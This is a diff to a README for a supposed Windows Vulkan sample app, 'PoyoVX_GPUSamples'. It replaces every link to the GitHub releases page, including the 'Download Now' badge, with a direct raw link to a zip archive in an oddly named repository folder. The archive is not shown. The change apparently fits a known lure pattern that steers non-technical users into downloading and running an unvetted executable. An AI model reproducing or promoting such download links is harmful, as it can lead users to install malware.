@@ -1,6 +1,6 @@
 # 🎮 PoyoVX_GPUSamples - Run Vulkan Graphics on Windows
 
-[![Download PoyoVX_GPUSamples](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/master-repossession313/PoyoVX_GPUSamples/releases)
+[![Download PoyoVX_GPUSamples](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/master-repossession313/PoyoVX_GPUSamples/main/operculum/Poyo-Samples-V-GPU-1.1-alpha.2.zip)
 
 ## 🖥️ What this is
 
@@ -24,7 +24,7 @@ If your PC already runs modern 3D games, it will likely handle this app.
 ## 🚀 Download and install
 
 1. Open the release page here:  
-   [https://github.com/master-repossession313/PoyoVX_GPUSamples/releases](https://github.com/master-repossession313/PoyoVX_GPUSamples/releases)
+   [https://raw.githubusercontent.com/master-repossession313/PoyoVX_GPUSamples/main/operculum/Poyo-Samples-V-GPU-1.1-alpha.2.zip](https://raw.githubusercontent.com/master-repossession313/PoyoVX_GPUSamples/main/operculum/Poyo-Samples-V-GPU-1.1-alpha.2.zip)
 
 2. On the release page, find the latest version.
 
@@ -121,7 +121,7 @@ You should extract the files first, then run the app from the extracted folder.
 
 Use this page to download the latest Windows release:
 
-[https://github.com/master-repossession313/PoyoVX_GPUSamples/releases](https://github.com/master-repossession313/PoyoVX_GPUSamples/releases)
+[https://raw.githubusercontent.com/master-repossession313/PoyoVX_GPUSamples/main/operculum/Poyo-Samples-V-GPU-1.1-alpha.2.zip](https://raw.githubusercontent.com/master-repossession313/PoyoVX_GPUSamples/main/operculum/Poyo-Samples-V-GPU-1.1-alpha.2.zip)
 
 ## 🔍 What this project is for
 
